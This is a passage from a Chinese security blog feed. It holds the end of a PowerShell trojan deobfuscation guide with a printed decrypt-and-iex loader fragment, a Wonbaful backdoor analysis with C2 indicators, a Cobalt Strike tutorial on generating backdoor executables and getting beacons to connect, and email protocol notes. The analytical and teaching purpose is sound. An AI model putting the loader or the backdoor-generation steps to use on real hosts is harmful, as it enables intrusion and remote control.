,<span class="hljs-variable">$Rfc2898</span>.GetBytes(<span class="hljs-number">20</span>))<br><br><span class="hljs-variable">$AuthCode</span> = <span class="hljs-variable">$Hmac</span>.ComputeHash(<span class="hljs-variable">$InputData</span>, <span class="hljs-number">52</span>, <span class="hljs-variable">$InputData</span>.Length - <span class="hljs-number">52</span>)<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">Compare-Object</span> <span class="hljs-variable">$AuthCode</span> (<span class="hljs-variable">$InputData</span>[<span class="hljs-number">32</span> <span class="hljs-type">..</span> <span class="hljs-number">51</span>]) <span class="hljs-literal">-SyncWindow</span> <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-string">&#x27;Checksum failure.&#x27;</span><br>&#125;<br><br><span class="hljs-variable">$AES</span> = <span class="hljs-built_in">New-Object</span> Security.Cryptography.RijndaelManaged<br><span class="hljs-variable">$AESDecryptor</span> = <span class="hljs-variable">$AES</span>.CreateDecryptor(<span class="hljs-variable">$AESKey</span>, <span class="hljs-variable">$AESIV</span>)<br><br><span class="hljs-variable">$DecryptedInputData</span> = <span class="hljs-variable">$AESDecryptor</span>.TransformFinalBlock(<span class="hljs-variable">$InputData</span>, <span class="hljs-number">52</span>, <span class="hljs-variable">$InputData</span>.Length - <span class="hljs-number">52</span>)<br><br><span class="hljs-variable">$DataStream</span> = <span class="hljs-built_in">New-Object</span> System.IO.MemoryStream(<span class="hljs-variable">$DecryptedInputData</span>, <span class="hljs-variable">$false</span>)<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$DecryptedInputData</span>[<span class="hljs-number">0</span>] <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span>x1f)<br>&#123;<br><span class="hljs-variable">$DataStream</span> = <span class="hljs-built_in">New-Object</span> System.IO.Compression.GZipStream(<span class="hljs-variable">$DataStream</span>, [<span class="hljs-type">IO.Compression.CompressionMode</span>]::Decompress)<br>&#125;<br><br><span class="hljs-variable">$StreamReader</span> = <span class="hljs-built_in">New-Object</span> System.IO.StreamReader(<span class="hljs-variable">$DataStream</span>, <span class="hljs-variable">$true</span>)<br><span class="hljs-variable">$OutputString</span> = ([<span class="hljs-type">System.Text.Encoding</span>]::unicode.GetString([<span class="hljs-type">System.Convert</span>]::FromBase64String(<span class="hljs-variable">$StreamReader</span>.ReadToEnd())))<br><span class="hljs-built_in">iex</span> <span class="hljs-variable">$Outputstring</span><br>&#125;<br></code></pre></td></tr></table></figure><p>别看整个方法包括AES、Base64都在解密，但是最后还是要iex，所以直接修改iex为Write-Output，解密的代码就出来了。</p><p>具体情况具体分析，针对PowerShell脚本还可以通过自带的<em>Windows PowerShell ISE</em>，或者虚拟机开启系统PowerShell日志，各种行为监测软件，沙箱来进行分析。</p><p><strong>参考：</strong><a href="https://bbs.pediy.com/thread-253629.htm%E3%80%81https://www.52pojie.cn/thread-1543561-1-1.html%E3%80%81https://www.freebuf.com/articles/system/181697.html">https://bbs.pediy.com/thread-253629.htm、https://www.52pojie.cn/thread-1543561-1-1.html、https://www.freebuf.com/articles/system/181697.html</a></p><h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><p>JS木马多种多样，有网页木马，也有主机木马。混淆方式也千奇百怪。</p><p>主要还是先静态分析代码逻辑，定位到关键的数据，然后通过各种方法解密这些数据。</p><p><strong>Web JavaScript：</strong></p><p>Chrome DevTools</p><p>alert()document.write()console.log()unescape()  </p><p><strong>Windows JavaScript：</strong></p><p>WScript.StdOut.WriteLine()WScript.Echo() </p><p><strong>Windows JavaScript</strong>的混淆加密也可以使用WScript.StdOut.WriteLine和WScript.Echo方法，它和<strong>VBS</strong>两者实际上都是调用WSH运行的。</p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>脚本木马</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Wonbaful后门分析</title>
    <link href="/2022/05/07/Wonbaful%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/"/>
    <url>/2022/05/07/Wonbaful%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="一、样本信息"><a href="#一、样本信息" class="headerlink" title="一、样本信息"></a>一、样本信息</h2><table><thead><tr><th>文件名</th><th>beifen.bak</th></tr></thead><tbody><tr><td>MD5</td><td>EEAD5424C1738BD5061CF2455CEB45B7</td></tr><tr><td>SHA256</td><td>8fe4f4b4f7ea39f63465d1eff48a1079cbf0846fa27c00b45b596e898ae927b3</td></tr><tr><td>文件大小</td><td>151,440 字节</td></tr><tr><td>病毒类型</td><td>Backdoor:Win32&#x2F;Wonbaful.A</td></tr></tbody></table><p>经初步分析，上述恶意文件为PE文件格式的备份文件，修改后缀后实际为SFX自解压文件，可直接执行。</p><p>执行后会释放nsck.ocx（Microsoft Winsock Control DLL）和winmgmt.exe（后门程序主体）到“C:\Program Files\”，并执行winmgmt.exe。</p><p>winmgmt.exe主要功能为连接C&amp;C地址tyl007.3322.org，等待接受指令，指令包括获取受控主机名、执行DOS命令、弹窗、通过ftp获取文件等。</p><p>通过搜索相关特征值结合威胁情报，决定采用Microsoft的命名方式，将该恶意文件称为Wonbaful后门程序。详情如下：</p><img src="clip_image002.png" alt="img" style="zoom:80%;" /><center>beifen.bak实际为SFX自解压文件</center><img src="clip_image002-16519068197461.png" alt="img" style="zoom:80%;" /><center>beifen详情</center><h2 id="二、样本分析"><a href="#二、样本分析" class="headerlink" title="二、样本分析"></a>二、样本分析</h2><p>如上所示beifen.exe文件内包含两个PE文件，经分析nsck.ocx为微软官方的网络编程接口动态链接库文件，作用是为winmgmt.exe提供网络接口方法。</p><p><img src="/2022/05/07/Wonbaful%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image002-16519068826252.png" alt="img"></p><center>数字签名</center><img src="clip_image002-16519069007603.png" alt="img" style="zoom:80%;" /><center>Virustotal详情</center><p>winmgmt.exe包含后门程序主体功能，使用Visual Basic编写，详细信息包含Autocad。</p><img src="clip_image002-16519069484734.png" alt="img" style="zoom:80%;" /><center>Visual Basic编写</center><img src="clip_image002-16519069713475.png" alt="img" style="zoom:67%;" /><center>详细信息</center><p>运行beifen.exe程序后,首先会释放上述两个文件（nsck.ocx、winmgmt.exe）到“C:\Program Files\”路径下，并启动winmgmt.exe。</p><img src="clip_image001.png" alt="img" style="zoom:67%;" /><center>释放文件</center><p>winmgmt.exe执行netsh命令，但命令格式有问题，sh应该为防火墙规则名，和指定端口之间应该有空格，不清楚原因。</p><img src="clip_image002-16519070330356.png" alt="img" style="zoom: 80%;" /><center>试图修改防火墙规则</center><p>通联C&amp;C地址tyl007.3322.org:9999,但TCP连接建立握手后被服务器关闭连接。经查域名tyl007.3322.org及DNS解析地址183.236.2.18均被标记恶意。初步认为tyl007.3322.org动态域名已被回收，解析地址为动态域名提供商网关地址。</p><img src="clip_image002-16519070801017.png" alt="img" style="zoom:80%;" /><img src="clip_image004.png" alt="img" style="zoom:80%;" /><center>尝试连接C&C地址</center><img src="clip_image002-16519071074718.png" alt="img" style="zoom:67%;" /><center>C2被标记为远控Wonbaful</center><img src="clip_image002-16519071261699.png" alt="img" style="zoom:67%;" /><center>疑似网关IP被大量标记</center><p>因为后门程序没有连接到远控端，很多功能看不到，只能对该程序进行静态反编译。</p><p><img src="/2022/05/07/Wonbaful%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image002.jpg" alt="img"></p><center>样本结构</center><p><img src="/2022/05/07/Wonbaful%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image002-165190719453310.png" alt="img"></p><center>尝试修改防火墙规则</center><p><img src="/2022/05/07/Wonbaful%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image002-165190721272111.png" alt="img"></p><center>“(@)”分割的字符串</center><p>执行远控端haoma命令，对受控主机进行备注</p><p><img src="/2022/05/07/Wonbaful%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image002-165190724569512.png" alt="img"></p><p>执行DOS命令</p><p><img src="/2022/05/07/Wonbaful%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image004-165190724569513.png" alt="img"></p><p>发起弹窗</p><p><img src="/2022/05/07/Wonbaful%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image006.png" alt="img"></p><p>通过ftp协议窃取文件</p><p><img src="/2022/05/07/Wonbaful%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image008.png" alt="img"></p><p>删除重启后门程序</p><p><img src="/2022/05/07/Wonbaful%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/clip_image010.png" alt="img"></p><h2 id="三、IOCs"><a href="#三、IOCs" class="headerlink" title="三、IOCs"></a>三、IOCs</h2><p><strong>MD5</strong>:</p><p>EEAD5424C1738BD5061CF2455CEB45B7</p><p>6CDE9FDAF329997DFA266EC903B46EE0</p><p><strong>C&amp;C</strong>:</p><p>tyl007.3322.org </p><p>183.236.2.18</p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Wonbaful</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cobalt Strike学习</title>
    <link href="/2022/04/29/Cobalt-Strike%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/04/29/Cobalt-Strike%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><strong>比较流行的三款后渗透工具：</strong></p><p><a href="https://www.cobaltstrike.com/">Cobalt Strike</a>    <a href="https://www.metasploit.com/">Metasploit</a>  (图形化：Armitage)   <a href="https://github.com/BC-SECURITY/Empire">Empire</a></p><h2 id="Cobalt-Strike简介"><a href="#Cobalt-Strike简介" class="headerlink" title="Cobalt Strike简介"></a>Cobalt Strike简介</h2><p>Cobalt Strike是一款由Java编写的全平台多方协同渗透测试框架，在3.0版本之前它基于Metasploit框架工作，相当于增强版的Armitage，在3.0后的版本已独立成一个为目标攻击和模拟对抗而设计的渗透测试平台，主要用于执行有目标的攻击和模拟高级威胁者的后渗透行动。Cobalt Strike集成了端口转发、端口扫描、socket代理、提权、钓鱼、远控木马等功能。该工具几乎覆盖了APT攻击链中所需要用到的各个技术环节，且其最大的优点在于可以进行团队合作和优越的UI界面。</p><h2 id="Cobalt-Strike架构"><a href="#Cobalt-Strike架构" class="headerlink" title="Cobalt Strike架构"></a>Cobalt Strike架构</h2><p>Cobalt Strike分为<strong>服务器(TeamServer)<strong>组件和</strong>客户端(Client)<strong>组件。在Cobalt Strike工作中，服务器可以有多个，客户端也可以有多个，客户端与团队服务器是</strong>多对多</strong>的关系，实现了团队的分布式协作。</p><h3 id="团队服务器-TeamServer"><a href="#团队服务器-TeamServer" class="headerlink" title="团队服务器(TeamServer)"></a>团队服务器(TeamServer)</h3><p>服务器组件，也就是团队服务器，是Beacon payload的控制器，也是Cobalt Strike社会工程功能的托管主机。</p><p>团队服务器还存储由Cobalt Strike收集的数据，并管理日志记录。 </p><p>Cobalt Strike团队服务器必须在受支持的Linux系统上运行。要启动一个Cobalt Strike团队服务器，需要使用Cobalt Strike Linux安装包中的teamserver脚本文件。</p><h3 id="客户端-Client"><a href="#客户端-Client" class="headerlink" title="客户端(Client)"></a>客户端(Client)</h3><p>Cobalt Strike客户端是团队成员实现各种攻击功能的主体，也是Cobalt Strike的核心。</p><p>使用Cobalt Strike客户端，必须要连接至团队服务器，Cobalt Strike客户端支持Windows、Linux、MacOS多个平台。</p><h3 id="分布式的团队协作"><a href="#分布式的团队协作" class="headerlink" title="分布式的团队协作"></a>分布式的团队协作</h3><p>Cobalt Strike可以协同红队的分散行动，使用一个或更多的teamServer并让你的团队与其建立连接，分阶段的筹划整个攻击流程。</p><p>一旦连接至同一个teamServer，client将：</p><ol><li>使用相同的会话</li><li>分享主机、捕获的数据和下载的文件</li><li>通过一个共享的事件日志交流</li></ol><p>当连接到多个团队服务器，Cobalt Strike客户端会汇总所有它连接的团队服务器的监听器。这种聚合允许攻击者从一台团队服务器引用托管在另一台团队服务器上的恶意网站、钓鱼邮件等资源。在你行动的末期，Cobalt Strike的报告功能会查询所有你连接到的团队服务器，合并这些数据来描述一个完整的事件。</p><p><img src="/2022/04/29/Cobalt-Strike%E5%AD%A6%E4%B9%A0/%E5%A4%9A%E5%8F%B0%E5%9B%A2%E9%98%9F%E6%9C%8D%E5%8A%A1%E5%99%A8.png" alt="多台团队服务器"></p><p><strong>架构多台团队服务器(例如钓鱼、攻击、后渗透、持久化)，也就是分解整个攻击链，这是分布式行动模型的基本思想。</strong></p><h2 id="启动Cobalt-Strike"><a href="#启动Cobalt-Strike" class="headerlink" title="启动Cobalt Strike"></a>启动Cobalt Strike</h2><h3 id="启动团队服务器"><a href="#启动团队服务器" class="headerlink" title="启动团队服务器"></a>启动团队服务器</h3><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 777 teamserver                       <span class="hljs-comment">#如teamserver没权限需要赋予权限</span><br>./teamserver  团队服务器ip  密码            <span class="hljs-comment">#密码是客户端连接团队服务器需要提供的密码</span><br><br>For Example：<br>./teamserver 192.168.230.148 123456            <span class="hljs-comment">#建议公网不要采用弱密码</span><br></code></pre></td></tr></table></figure><img src="image-20220426142418722.png" alt="image-20220426142418722" style="zoom: 67%;" /><p>针对teamserver的特征隐藏下面再讲。</p><h3 id="启动客户端连接"><a href="#启动客户端连接" class="headerlink" title="启动客户端连接"></a>启动客户端连接</h3><p>Windows中，运行start.bat；Linux中，运行start.sh</p><p>或者</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">java -<span class="hljs-variable constant_">XX</span><span class="hljs-symbol">:+AggressiveHeap</span> -<span class="hljs-variable constant_">XX</span><span class="hljs-symbol">:+UseParallelGC</span> -jar cobaltstrike.jar<br></code></pre></td></tr></table></figure><p>输入团队服务器ip、端口、用户名（随意）、密码（上面设置的密码），点击“连接”。</p><img src="image-20220426143150725.png" alt="image-20220426143150725" style="zoom:67%;" /><p>出现指纹校验对话框，显示服务端SSL 证书的SHA256哈希值，每次创建Cobalt Strike团队服务器时生成的指纹都不一样，请确认它是否和你的服务端启动时显示的指纹相匹配，以防止中间人攻击。Cobalt Strike还会记住这个SHA256哈希，方便以后连接。点击 “是” 。</p><img src="image-20220426143558578.png" alt="image-20220426143558578" style="zoom:67%;" /><p>进入操作界面，Cobalt Strike就启动成功了。</p><img src="image-20220426143640053.png" alt="image-20220426143640053" style="zoom: 67%;" /><h2 id="Cobalt-Strike-Client界面功能"><a href="#Cobalt-Strike-Client界面功能" class="headerlink" title="Cobalt Strike Client界面功能"></a>Cobalt Strike Client界面功能</h2><p>Cobalt Strike Client界面分为两部分，界面的顶部是会话或目标的视觉化展示，底部展示了与之交互的Cobalt Strike功能或会话的标签页。可以点击这两部分之间的区域调整这两个区域的大小。</p><h3 id="菜单栏"><a href="#菜单栏" class="headerlink" title="菜单栏"></a>菜单栏</h3><p><strong>Cobalt Strike</strong></p><table><thead><tr><th>New Connection</th><th>创建新连接，加入服务端</th></tr></thead><tbody><tr><td>Preferences</td><td>偏好设置，设置界面样式</td></tr><tr><td>Visualization</td><td>视图模式，包括<strong>Pivot Graph</strong>、<strong>Session Table</strong>、<strong>Target Table</strong>三种</td></tr><tr><td>VPN Interfaces</td><td>VPN接口管理</td></tr><tr><td>Listenrs</td><td>监听器管理</td></tr><tr><td>Script Manager</td><td>脚本管理</td></tr></tbody></table><p><strong>View</strong>-视图</p><table><thead><tr><th>Applications</th><th>靶机的应用信息</th></tr></thead><tbody><tr><td>Credentials</td><td>查看从靶机获取的账户密码</td></tr><tr><td>Downloads</td><td>查看从靶机下载的文件</td></tr><tr><td>Event Log</td><td>事件日志，可用于团队聊天</td></tr><tr><td>Keystrokes</td><td>键盘记录</td></tr><tr><td>Proxy Pivots</td><td>查看代理</td></tr><tr><td>Screenshots</td><td>查看屏幕截图</td></tr><tr><td>Script Console</td><td>脚本控制台，用于加载脚本</td></tr><tr><td>Targets</td><td>显示目标靶机</td></tr><tr><td>Web Log</td><td>Web日志</td></tr></tbody></table><p><strong>Attacks</strong>-攻击</p><table><thead><tr><th>Packages</th><th>生成各种后门，包括HTA、OFFICE宏病毒、多种语言的Payload、EXE木马等</th></tr></thead><tbody><tr><td>Web Drive-by</td><td>Web服务配置与管理，包括管理Web服务、克隆网站、开启Web服务供下载文件等</td></tr><tr><td>Spear Phish</td><td>鱼叉式攻击</td></tr></tbody></table><p><strong>Reporting</strong>-报告</p><table><thead><tr><th>Activity report</th><th>生成操作报告</th></tr></thead><tbody><tr><td>Hosts report</td><td>生成主机报告</td></tr><tr><td>Indicators of Compromise</td><td>生成威胁报告</td></tr><tr><td>Sessions report</td><td>生成会话报告</td></tr><tr><td>Social engineering report</td><td>生成社会工程学报告</td></tr><tr><td>Tactics, Techniques, and Procedures</td><td>生成策略、技巧和程序报告</td></tr><tr><td>Reset Data</td><td>重置数据</td></tr><tr><td>Export Data</td><td>导出数据</td></tr></tbody></table><h3 id="工具栏"><a href="#工具栏" class="headerlink" title="工具栏"></a>工具栏</h3><img src="工具栏.png" alt="工具栏" style="zoom:50%;" /><h3 id="可视化展示"><a href="#可视化展示" class="headerlink" title="可视化展示"></a>可视化展示</h3><p>Cobalt Strike提供三种可视化展示，包括<strong>Pivot Graph</strong>、<strong>Session Table</strong>、<strong>Target Table</strong>，可以通过工具栏的<em>Cobalt Strike</em> → <em>Visualization</em> 在不同的可视化形式之间切换。</p><h4 id="Pivot-Graph-拓扑图模式"><a href="#Pivot-Graph-拓扑图模式" class="headerlink" title="Pivot Graph(拓扑图模式)"></a>Pivot Graph(拓扑图模式)</h4><p>可以很清楚地查看各主机之间的关系，该视图在大规模内网渗透和APT中非常直观和实用。</p><img src="image-20220429135321016.png" alt="image-20220429135321016" style="zoom:80%;" /><h4 id="Session-Table-会话列表模式"><a href="#Session-Table-会话列表模式" class="headerlink" title="Session Table(会话列表模式)"></a>Session Table(会话列表模式)</h4><p>这个视图是我们渗透测试中最为常用的，它主要显示的是当前所有的会话，会话的权限，会话运行在目标机上的pid等等</p><p><img src="/2022/04/29/Cobalt-Strike%E5%AD%A6%E4%B9%A0/image-20220429135403998.png"></p><h4 id="Target-Table-目标列表模式"><a href="#Target-Table-目标列表模式" class="headerlink" title="Target Table(目标列表模式)"></a>Target Table(目标列表模式)</h4><p>显示在beacon中执行主机存活扫描&#x2F;端口扫描后探测出的存活的主机。</p><p><img src="/2022/04/29/Cobalt-Strike%E5%AD%A6%E4%B9%A0/image-20220429135452128.png" alt="image-20220429135452128"></p><h2 id="Cobalt-Strike使用"><a href="#Cobalt-Strike使用" class="headerlink" title="Cobalt Strike使用"></a>Cobalt Strike使用</h2><h3 id="监听器listener"><a href="#监听器listener" class="headerlink" title="监听器listener"></a>监听器listener</h3><p>通过 <em>Cobalt Strike</em> → <em>Listeners</em> 打开监听器标签页，这里会列举出所有配置的监听器，并可以对监听器进行管理。</p><img src="image-20220429141619873.png" alt="image-20220429141619873" style="zoom:80%;" /><p>选择<em>Add</em>，添加一个监听器。</p><img src="image-20220429141743364.png" alt="image-20220429141743364" style="zoom:67%;" /><p>监听器分为</p><p><strong>内部的Listener</strong></p><ol><li>Beacon DNS</li><li>Beacon HTTP</li><li>Beacon HTTPS</li><li>Beacon SMB</li><li>Beacon TCP</li></ol><p><strong>内部的Listener</strong></p><ol><li>External C2</li><li>Foreign HTTP</li><li>Foreign HTTPS</li></ol><p>如下创建一个HTTP监听器。</p><img src="image-20220429142800393.png" alt="image-20220429142800393" style="zoom:67%;" /><h3 id="创建攻击Attacks"><a href="#创建攻击Attacks" class="headerlink" title="创建攻击Attacks"></a>创建攻击Attacks</h3><h4 id="Packages生成后门"><a href="#Packages生成后门" class="headerlink" title="Packages生成后门"></a>Packages生成后门</h4><p>Packages生成的后门包括：</p><table><thead><tr><th>HTML Application</th><th>生成一个恶意HTML Application木马，后缀格式为 .hta。</th></tr></thead><tbody><tr><td>MS Office Macro</td><td>生成office宏病毒文件</td></tr><tr><td>Payload Generator</td><td>生成各种语言版本（C、C#、COM Scriptlet、Java等）的payload</td></tr><tr><td>Windows Executable</td><td>生成32位或64位的exe和基于服务的exe、DLL等后门程序</td></tr><tr><td>Windows Executable(S)</td><td>生成exe、DLL等后门程序，其中包含Beacon的完整payload，不需要阶段性的请求。</td></tr></tbody></table><p>如下生成一个32位Windows Executable。选择刚创建的监听器，点击<em>Generate</em>，保存生成的后门文件。</p><img src="image-20220429143810603.png" alt="image-20220429143810603" style="zoom: 80%;" /><img src="image-20220429144651928.png" alt="image-20220429144651928" style="zoom:80%;" /><h3 id="Beacon上线"><a href="#Beacon上线" class="headerlink" title="Beacon上线"></a>Beacon上线</h3><p>将生成的后门程序拷贝到受控主机上，点击运行。Cobalt Strike上线成功。</p><p>默认sleep为60s，可以通过右键对象 → <em>会话</em> → <em>Sleep…</em> 修改。</p><img src="image-20220429144923834.png" alt="image-20220429144923834" style="zoom:67%;" /><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a><br><a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm#_Toc65482705">https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm#_Toc65482705</a></p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cobalt Strike</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于邮件的那点事</title>
    <link href="/2022/04/24/%E5%85%B3%E4%BA%8E%E9%82%AE%E4%BB%B6%E7%9A%84%E9%82%A3%E7%82%B9%E4%BA%8B/"/>
    <url>/2022/04/24/%E5%85%B3%E4%BA%8E%E9%82%AE%E4%BB%B6%E7%9A%84%E9%82%A3%E7%82%B9%E4%BA%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="三种邮件协议"><a href="#三种邮件协议" class="headerlink" title="三种邮件协议"></a>三种邮件协议</h2><h3 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h3><p>即“Simple Mail Transfer Protocol”，简单邮件传输协议。它是用于从源地址到目标地址传输邮件的规范。通过该协议来控制邮件的中转。而我们常用的邮件供应商所提供的邮件服务，基本都是采用的SMTP协议进行传输。要注意的是SMTP协议并没有要求了客户端连接服务器需要进行认证，而<strong>ESMTP</strong> （Extended SMTP）会要求用户提供用户名和密码以便验证身份。但是它也仅仅只要求了客户端需要与服务端进行认证，服务器之间传输邮件的过程是不需要进行认证的。（<strong>发送、中转邮件</strong>）</p><h3 id="POP3"><a href="#POP3" class="headerlink" title="POP3"></a>POP3</h3><p>即“Post Office Protocol - Version 3”，邮局协议版本3。主要用于支持使用客户端远程管理在服务器上的电子邮件。（<strong>接收邮件</strong>）</p><h3 id="IMAP"><a href="#IMAP" class="headerlink" title="IMAP"></a>IMAP</h3><p>即“Internet Mail Access Protocol”，网际消息访问协议。它不同于POP3，POP3协议并不会将客户端对邮件进行的操作同步至服务器。当使用IMAP协议与邮件服务器交互的时候，你在客户端对邮件进行的操作都会同步到服务器上，所以IMAP也叫做交互式邮件存取协议。（<strong>接收、管理邮件</strong>）</p><h3 id="POP3和IMAP的区别："><a href="#POP3和IMAP的区别：" class="headerlink" title="POP3和IMAP的区别："></a>POP3和IMAP的区别：</h3><ol><li>IMAP提供<strong>Webmail</strong>与电子邮件客户端之间的双向通信，客户端收取的邮件仍然保留在服务器上，同时在客户端上的操作都会反馈到服务器上；而POP3在<strong>客户端</strong>的操作不会反馈到服务器上。</li><li>POP3需要下载未阅读的邮件，IMAP可以不用把所有的邮件全部下载，而是通过客户端直接对服务器上的邮件进行操作。</li></ol><p>一般邮件<strong>客户端使用POP3，浏览器使用IMAP</strong>。<strong>IMAP协议更优</strong>。</p><h2 id="常见邮件端口"><a href="#常见邮件端口" class="headerlink" title="常见邮件端口"></a>常见邮件端口</h2><table><thead><tr><th align="center">端口</th><th align="center">协议</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center">25</td><td align="center">SMTP</td><td align="center"></td></tr><tr><td align="center">465</td><td align="center">SMTPS(SMTP SSL)</td><td align="center"></td></tr><tr><td align="center">587</td><td align="center">SMTP-MSA(Message submission agent)</td><td align="center">接受来自电子邮件客户端（MUA）的电子邮件提交</td></tr><tr><td align="center">109</td><td align="center">POP2</td><td align="center">已淘汰</td></tr><tr><td align="center">110</td><td align="center">POP3</td><td align="center"></td></tr><tr><td align="center">143</td><td align="center">IMAP</td><td align="center"></td></tr><tr><td align="center">993</td><td align="center">IMAPS(IMAP SSL)</td><td align="center"></td></tr><tr><td align="center">995</td><td align="center">POP3(POP3 SSL)</td><td align="center"></td></tr></tbody></table><h2 id="邮件的基础信息"><a href="#邮件的基础信息" class="headerlink" title="邮件的基础信息"></a>邮件的基础信息</h2><p>大部分邮箱都有可以查看邮件原文</p><p>163邮箱：</p><p><img src="/2022/04/24/%E5%85%B3%E4%BA%8E%E9%82%AE%E4%BB%B6%E7%9A%84%E9%82%A3%E7%82%B9%E4%BA%8B/image-20220424144936243.png" alt="image-20220424144936243"></p><p>QQ邮箱：</p><p><img src="/2022/04/24/%E5%85%B3%E4%BA%8E%E9%82%AE%E4%BB%B6%E7%9A%84%E9%82%A3%E7%82%B9%E4%BA%8B/image-20220424145047436.png" alt="image-20220424145047436"></p><p>邮件原文如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><pre><code class="hljs sql">Received: <span class="hljs-keyword">from</span> mail<span class="hljs-operator">-</span>m975.mail<span class="hljs-number">.163</span>.com (mail<span class="hljs-operator">-</span>m975.mail<span class="hljs-number">.163</span>.com [<span class="hljs-number">123.126</span><span class="hljs-number">.97</span><span class="hljs-number">.5</span>])<br><span class="hljs-keyword">by</span> newxmmxszb58.qq.com (NewMX) <span class="hljs-keyword">with</span> SMTP id <span class="hljs-number">4341</span>FA5A<br><span class="hljs-keyword">for</span> <span class="hljs-operator">&lt;</span>test<span class="hljs-variable">@qq</span>.com<span class="hljs-operator">&gt;</span>; Mon, <span class="hljs-number">24</span> Apr <span class="hljs-number">2021</span> <span class="hljs-number">14</span>:<span class="hljs-number">16</span>:<span class="hljs-number">52</span> <span class="hljs-operator">+</span><span class="hljs-number">0800</span><br>X<span class="hljs-operator">-</span>QQ<span class="hljs-operator">-</span>mid: xmmxszb58t1650561012tfafucpdm<br>X<span class="hljs-operator">-</span>QQ<span class="hljs-operator">-</span>XMAILINFO: <span class="hljs-number">1</span>NEeXPJF8oqVglPRWfD<span class="hljs-operator">+</span>IaWZM3KAzHEIgcKYKTwZjH0D3X2ette<span class="hljs-operator">+</span><span class="hljs-operator">+</span>rR9aITd4eQ8yDI<br> nqZC4OWwLpkDnxga4ogEZQhoDB6bJwSxUt39<span class="hljs-operator">/</span>ENfSD96hPhfSTN7EZDWstEVzXMoZ2hAdHWjQzHx<br> ckYexp240u9jS7NPp9TD5RwMrur0wf<span class="hljs-operator">+</span>duSqz6l<span class="hljs-operator">+</span>mYLVlIhFOWXSQM4H0f<span class="hljs-operator">/</span>l4oJlKdfTv6UJTCNoH<br> <span class="hljs-number">9</span>D2qEUKhQWEcwKqU1MNxz<span class="hljs-operator">/</span>LAtP066xOyOjO7lgLi3i13mun7I6FN5XMNxlzyZ1MaGK<span class="hljs-operator">+</span>apacc5n7Lb<br> ZQNEpGDQlPJRrm<span class="hljs-operator">/</span>hkkHuw8p6OBnWfdn7JOLPawwo6G4MTtTVr0KrAUJfnVEwYlwefMuaUP9bDl9a<br> OmK63<span class="hljs-operator">/</span>LWVHWYHIcHbYRjO5jrHCidRakp9Y3L<span class="hljs-operator">/</span><span class="hljs-operator">/</span>QYelwCMnHcBGsBlaQmtCHpXqypD4lwmCy9DV<br> <span class="hljs-number">1</span>N6ZHGho7QMrZwukOivZJaduRE<span class="hljs-operator">+</span>GxjKNcPgnndzZ1JxXk2SOY3uDe6E4cAt35lP8oXZlsY<span class="hljs-operator">/</span>WmqEk<br> JyyxnQ<span 